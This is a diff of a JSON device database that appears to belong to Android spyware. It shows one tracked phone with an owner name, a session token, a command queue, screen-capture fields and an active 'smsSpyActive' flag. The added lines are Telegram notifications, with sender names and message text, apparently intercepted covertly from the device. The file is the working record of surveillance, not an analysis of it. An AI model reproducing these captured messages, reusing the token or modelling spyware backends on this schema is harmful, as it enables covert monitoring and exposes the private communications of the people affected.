@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632102009,
+    "lastSeen": 1775632104876,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,62 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "@Vanzzo_Shop_Official",
+        "time": "08/04 14:08",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632105389
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "10 new messages from 10 chats",
+        "time": "08/04 14:08",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632105181
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:08",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632105001
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "@Vanzzo_Shop_Official",
+        "time": "08/04 14:08",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632104890
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "11 new messages from 11 chats",
+        "time": "08/04 14:08",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632104823
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:08",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632104816
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "@Vanzzo_Shop_Official",
+        "time": "08/04 14:08",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632104385
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
